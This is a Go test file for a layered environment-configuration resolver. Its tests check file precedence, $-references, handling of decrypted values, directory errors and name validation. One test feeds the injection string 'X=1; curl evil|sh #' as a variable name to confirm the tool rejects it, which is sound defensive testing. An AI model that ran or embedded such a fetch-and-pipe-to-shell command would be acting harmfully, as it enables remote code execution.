package resolve

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/thinkjones/easy-config/cli/internal/backend"
)

// tree writes files under two temp .ezc directories, from keys like
// "store/common.yaml" and "repo/env.local.yaml".
func tree(t *testing.T, files map[string]string) (storeDir, repoDir string) {
	t.Helper()
	root := t.TempDir()
	storeDir, repoDir = filepath.Join(root, "store", ".ezc"), filepath.Join(root, "repo", ".ezc")
	for _, d := range []string{storeDir, repoDir} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for key, content := range files {
		layer, name, _ := strings.Cut(key, "/")
		dir := storeDir
		if layer == "repo" {
			dir = repoDir
		}
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return storeDir, repoDir
}

func mustResolve(t *testing.T, o Options) Result {
	t.Helper()
	r, err := Load(o)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func TestPrecedence(t *testing.T) {
	store, repo := tree(t, map[string]string{
		"store/common.yaml":    "A: s-common\nB: s-common\nC: s-common\nD: s-common\n",
		"store/env.local.yaml": "B: s-env\nC: s-env\nD: s-env\n",
		"repo/common.yaml":     "C: r-common\nD: r-common\n",
		"repo/env.local.yaml":  "D: r-env\n",
	})
	r := mustResolve(t, Options{StoreDir: store, RepoDir: repo, Env: "local"})
	for name, want := range map[string]string{"A": "s-common", "B": "s-env", "C": "r-common", "D": "r-env"} {
		if r.Env[name] != want {
			t.Errorf("%s: got %q, want %q", name, r.Env[name], want)
		}
	}
	if r.Origin["D"] != filepath.Join(repo, "env.local.yaml") {
		t.Errorf("origin of D: %s", r.Origin["D"])
	}
	want := []string{filepath.Join(store, "common.yaml"), filepath.Join(store, "env.local.yaml"), filepath.Join(repo, "common.yaml")}
	if got := r.Overrides("D"); !slices.Equal(got, want) {
		t.Errorf("overrides: got %v, want %v", got, want)
	}
	if len(r.Sources) != 8 {
		t.Fatalf("sources: %d", len(r.Sources))
	}
	for _, s := range r.Sources {
		if strings.HasSuffix(s.Path, ".enc.yaml") && s.Present {
			t.Errorf("%s reported present", s.Path)
		}
	}
}

func TestSelectorRecorded(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/env.prod.yaml": "A: 1\n"})
	r := mustResolve(t, Options{RepoDir: repo, Env: "prod"})
	for _, v := range SelectorVars {
		if r.Env[v] != "prod" || r.Origin[v] != ShellOrigin {
			t.Errorf("%s: %q from %q", v, r.Env[v], r.Origin[v])
		}
	}
	if r.EnvName != "prod" || r.EnvLabel() != "prod" {
		t.Errorf("env name %q, label %q", r.EnvName, r.EnvLabel())
	}
}

func TestUnknownEnvironmentListsValid(t *testing.T) {
	store, repo := tree(t, map[string]string{
		"repo/env.local.yaml": "A: 1\n", "repo/env.prod.yaml": "A: 1\n", "store/env.staging.yaml": "A: 1\n",
	})
	_, err := Load(Options{StoreDir: store, RepoDir: repo, Env: "prd"})
	if err == nil || !strings.Contains(err.Error(), `no environment "prd"`) || !strings.Contains(err.Error(), "Valid: local, prod, staging") {
		t.Errorf("got %v", err)
	}
}

func TestUnknownEnvironmentWithNoneFound(t *testing.T) {
	_, repo := tree(t, nil)
	_, err := Load(Options{RepoDir: repo, Env: "prod"})
	if err == nil || !strings.Contains(err.Error(), "No environment files found.") {
		t.Errorf("got %v", err)
	}
}

func TestEnvironmentOnlyInStore(t *testing.T) {
	store, repo := tree(t, map[string]string{"store/env.prod.yaml": "A: 1\n", "repo/common.yaml": "B: 2\n"})
	r := mustResolve(t, Options{StoreDir: store, RepoDir: repo, Env: "prod"})
	if r.Env["A"] != "1" || r.Env["B"] != "2" {
		t.Errorf("got %v", r.Env)
	}
}

func TestNoEnvNamedDefaultsToLocal(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/env.local.yaml": "A: 1\n"})
	r := mustResolve(t, Options{RepoDir: repo})
	if r.EnvName != DefaultEnv || r.CommonOnly {
		t.Errorf("got %q, common only %v", r.EnvName, r.CommonOnly)
	}
}

func TestNoEnvNamedAndNoLocalIsCommonOnly(t *testing.T) {
	store, repo := tree(t, map[string]string{"store/common.yaml": "A: 1\n", "repo/env.prod.yaml": "B: 2\n"})
	r := mustResolve(t, Options{StoreDir: store, RepoDir: repo})
	if !r.CommonOnly || r.EnvName != "" || r.EnvLabel() != "(none)" {
		t.Errorf("got %q, %q, common only %v", r.EnvName, r.EnvLabel(), r.CommonOnly)
	}
	if len(r.Env) != 1 || r.Env["A"] != "1" {
		t.Errorf("env: %v", r.Env)
	}
	if len(r.Sources) != 4 {
		t.Errorf("sources: %d", len(r.Sources))
	}
}

func TestStoreMissing(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/env.local.yaml": "A: 1\n"})
	for _, store := range []string{filepath.Join(t.TempDir(), "absent"), ""} {
		r := mustResolve(t, Options{StoreDir: store, RepoDir: repo})
		if !r.StoreMissing || r.Env["A"] != "1" {
			t.Errorf("store %q: missing %v, env %v", store, r.StoreMissing, r.Env)
		}
	}
}

func TestNoRepoDir(t *testing.T) {
	store, _ := tree(t, map[string]string{"store/common.yaml": "A: 1\n"})
	r := mustResolve(t, Options{StoreDir: store})
	if !r.CommonOnly || r.Env["A"] != "1" {
		t.Errorf("common only %v, env %v", r.CommonOnly, r.Env)
	}
	for _, s := range r.Sources {
		if s.Layer != "store" {
			t.Errorf("%s has layer %q", s.Path, s.Layer)
		}
	}
}

func TestReferences(t *testing.T) {
	store, repo := tree(t, map[string]string{
		"store/common.yaml": "ROOT: /r\n",
		"repo/common.yaml":  "A: $ROOT/a\nB: ${A}/b\nC: cost $$5\nD: trailing $\nE: $HOME/e\n",
	})
	r := mustResolve(t, Options{StoreDir: store, RepoDir: repo, Home: "/h"})
	want := map[string]string{"A": "/r/a", "B": "/r/a/b", "C": "cost $5", "D": "trailing $", "E": "/h/e"}
	for name, w := range want {
		if r.Env[name] != w {
			t.Errorf("%s: got %q, want %q", name, r.Env[name], w)
		}
	}
}

func TestForwardReferenceIsError(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/env.local.yaml": "A: $B/x\nB: y\n"})
	_, err := Load(Options{RepoDir: repo, Env: "local"})
	if err == nil || !strings.Contains(err.Error(), "A references a name that is not defined") || !strings.Contains(err.Error(), "Write $$ if you meant a literal dollar sign") {
		t.Errorf("got %v", err)
	}
}

func TestUnknownReferenceNamesScope(t *testing.T) {
	store, repo := tree(t, map[string]string{"store/common.yaml": "ROOT: /r\n", "repo/env.local.yaml": "A: $ROOTT\n"})
	_, err := Load(Options{StoreDir: store, RepoDir: repo, Env: "local"})
	if err == nil || !strings.Contains(err.Error(), "defined so far: ROOT") {
		t.Errorf("got %v", err)
	}
}

func TestEncryptedValuesAreNotSubstituted(t *testing.T) {
	store, repo := tree(t, map[string]string{"repo/common.enc.yaml": "x: y\n", "store/common.yaml": "ROOT: /r\n"})
	decrypt := func(string) ([]backend.Pair, error) {
		return []backend.Pair{{Name: "TOKEN", Value: "a$ROOT$$b"}}, nil
	}
	r := mustResolve(t, Options{StoreDir: store, RepoDir: repo, Decrypt: decrypt})
	if r.Env["TOKEN"] != "a$ROOT$$b" {
		t.Errorf("got %q", r.Env["TOKEN"])
	}
}

func TestEncryptedFilePresentWithoutDecrypter(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/common.enc.yaml": "x: y\n"})
	_, err := Load(Options{RepoDir: repo})
	if err == nil || !strings.Contains(err.Error(), "common.enc.yaml") {
		t.Errorf("got %v", err)
	}
}

func TestEnvs(t *testing.T) {
	store, repo := tree(t, map[string]string{
		"store/env.local.yaml": "A: 1\n", "store/env.prod.enc.yaml": "x: y\n",
		"repo/env.prod.yaml": "A: 1\n", "repo/common.yaml": "A: 1\n",
	})
	if got, err := Envs(store, repo); err != nil || !slices.Equal(got, []string{"local", "prod"}) {
		t.Errorf("got %v, %v", got, err)
	}
}

func TestEnvsIgnoresGlobCharactersInDirectory(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "my[proj]*?", ".ezc")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "env.local.yaml"), []byte("A: 1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got, err := Envs(dir); err != nil || !slices.Equal(got, []string{"local"}) {
		t.Errorf("got %v, %v", got, err)
	}
	r := mustResolve(t, Options{RepoDir: dir})
	if r.CommonOnly || r.Env["A"] != "1" {
		t.Errorf("common only %v, env %v", r.CommonOnly, r.Env)
	}
}

func TestSelectorInFileIsError(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/common.yaml": "APP_ENV: fromfile\n"})
	_, err := Load(Options{RepoDir: repo})
	if err == nil || !strings.Contains(err.Error(), "APP_ENV names the environment and comes from the shell or the command line; remove it from this file.") {
		t.Errorf("got %v", err)
	}
}

func TestSelectorInDecryptedFileIsError(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/common.enc.yaml": "x: y\n"})
	decrypt := func(string) ([]backend.Pair, error) { return []backend.Pair{{Name: "EZC_ENV", Value: "s"}}, nil }
	_, err := Load(Options{RepoDir: repo, Decrypt: decrypt})
	if err == nil || !strings.Contains(err.Error(), "EZC_ENV names the environment") {
		t.Errorf("got %v", err)
	}
}

func TestInvalidVariableNamesAreErrors(t *testing.T) {
	for _, name := range []string{"X=1; curl evil|sh #", "", "1ABC", "A-B", "A B", "A\nB"} {
		t.Run(name, func(t *testing.T) {
			_, repo := tree(t, map[string]string{"repo/common.yaml": "x: y\n", "repo/common.enc.yaml": "x: y\n"})
			if err := os.WriteFile(filepath.Join(repo, "common.yaml"), []byte(strconv.Quote(name)+": x\n"), 0o600); err != nil {
				t.Fatal(err)
			}
			_, err := Load(Options{RepoDir: repo})
			if err == nil || !strings.Contains(err.Error(), "is not a valid variable name") {
				t.Errorf("plaintext: got %v", err)
			}
			decrypt := func(string) ([]backend.Pair, error) { return []backend.Pair{{Name: name, Value: "v"}}, nil }
			_, err = Load(Options{RepoDir: repo, Decrypt: decrypt})
			if err == nil || !strings.Contains(err.Error(), "is not a valid variable name") {
				t.Errorf("decrypted: got %v", err)
			}
		})
	}
}

func TestValidVariableNamesAreAccepted(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/common.yaml": "_OK1: a\nlower_case: b\n"})
	r := mustResolve(t, Options{RepoDir: repo})
	if r.Env["_OK1"] != "a" || r.Env["lower_case"] != "b" {
		t.Errorf("got %v", r.Env)
	}
}

func TestNULInAValueIsAnError(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/common.yaml": "A: \"hunter2\\0b\"\n"})
	_, err := Load(Options{RepoDir: repo})
	want := filepath.Join(repo, "common.yaml") + ": A contains a NUL byte, which an environment variable cannot hold"
	if err == nil || err.Error() != want {
		t.Errorf("plaintext: got %v, want %s", err, want)
	}

	_, repo = tree(t, map[string]string{"repo/common.enc.yaml": "x: y\n"})
	decrypt := func(string) ([]backend.Pair, error) {
		return []backend.Pair{{Name: "TOKEN", Value: "hunter2\x00b"}}, nil
	}
	_, err = Load(Options{RepoDir: repo, Decrypt: decrypt})
	want = filepath.Join(repo, "common.enc.yaml") + ": TOKEN contains a NUL byte, which an environment variable cannot hold"
	if err == nil || err.Error() != want {
		t.Errorf("decrypted: got %v, want %s", err, want)
	}
}

// A store that is there but is not a readable folder is an error, never "no store".
func TestStoreThatIsNotAFolder(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/env.local.yaml": "A: 1\n"})
	root := t.TempDir()

	// The store's .ezc is a file.
	asFile := filepath.Join(root, "a", ".ezc")
	if err := os.MkdirAll(filepath.Dir(asFile), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(asFile, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	// The store's root is a file.
	underFile := filepath.Join(root, "b", ".ezc")
	if err := os.WriteFile(filepath.Dir(underFile), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	for _, store := range []string{asFile, underFile} {
		_, err := Load(Options{StoreDir: store, RepoDir: repo})
		if err == nil || err.Error() != store+": the store is not a folder" {
			t.Errorf("got %v", err)
		}
	}
}

func TestStoreThatCannotBeRead(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads everything")
	}
	_, repo := tree(t, map[string]string{"repo/env.local.yaml": "A: 1\n"})
	root := filepath.Join(t.TempDir(), "store")
	store := filepath.Join(root, ".ezc")
	if err := os.MkdirAll(store, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(root, 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(root, 0o755) })
	_, err := Load(Options{StoreDir: store, RepoDir: repo})
	if err == nil || !strings.Contains(err.Error(), store) || !strings.Contains(err.Error(), "permission denied") {
		t.Errorf("got %v", err)
	}
}

func TestRepoDirThatIsNotAFolder(t *testing.T) {
	file := filepath.Join(t.TempDir(), ".ezc")
	if err := os.WriteFile(file, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	_, err := Load(Options{RepoDir: file})
	if err == nil || err.Error() != file+": the repo's .ezc is not a folder" {
		t.Errorf("got %v", err)
	}
	// One that does not exist supplies nothing, as before.
	r := mustResolve(t, Options{RepoDir: filepath.Join(t.TempDir(), "absent", ".ezc")})
	if len(r.Env) != 0 || len(r.Sources) != 0 {
		t.Errorf("got %v, %v", r.Env, r.Sources)
	}
}

func TestReservedEnvName(t *testing.T) {
	_, repo := tree(t, nil)
	_, err := Load(Options{RepoDir: repo, Env: "enc"})
	if err == nil || !strings.Contains(err.Error(), "enc is a reserved name") {
		t.Errorf("got %v", err)
	}
}

func TestInvalidEnvName(t *testing.T) {
	_, repo := tree(t, nil)
	for _, name := range []string{"../x", "a b"} {
		_, err := Load(Options{RepoDir: repo, Env: name})
		if err == nil || !strings.Contains(err.Error(), strconv.Quote(name)+" is not a valid environment name") {
			t.Errorf("%q: got %v", name, err)
		}
	}
}

func TestEnvEncFileIsNotAnEnvironment(t *testing.T) {
	_, repo := tree(t, map[string]string{"repo/env.enc.yaml": "x: y\n", "repo/env.local.yaml": "A: 1\n"})
	got, err := Envs(repo)
	if err != nil || !slices.Equal(got, []string{"local"}) {
		t.Errorf("got %v, %v", got, err)
	}
}

func TestUnknownReferenceHidesTheFragment(t *testing.T) {
	store, repo := tree(t, map[string]string{"store/common.yaml": "ROOT: /r\n", "repo/env.local.yaml": "PW: P@ss$word123\n"})
	_, err := Load(Options{StoreDir: store, RepoDir: repo, Env: "local"})
	if err == nil || !strings.Contains(err.Error(), "PW references a name that is not defined") || !strings.Contains(err.Error(), "defined so far") || strings.Contains(err.Error(), "word123") {
		t.Errorf("got %v", err)
	}
}

func TestEnvsReturnsOnlyValidNames(t *testing.T) {
	_, repo := tree(t, map[string]string{
		"repo/env.a.b.yaml": "A: 1\n", "repo/env.enc.enc.yaml": "x: y\n", "repo/env..yaml": "A: 1\n",
		"repo/env.ok.yaml": "A: 1\n", "repo/env.fine.enc.yaml": "x: y\n",
	})
	got, err := Envs(repo)
	if err != nil || !slices.Equal(got, []string{"fine", "ok"}) {
		t.Fatalf("got %v, %v", got, err)
	}
}
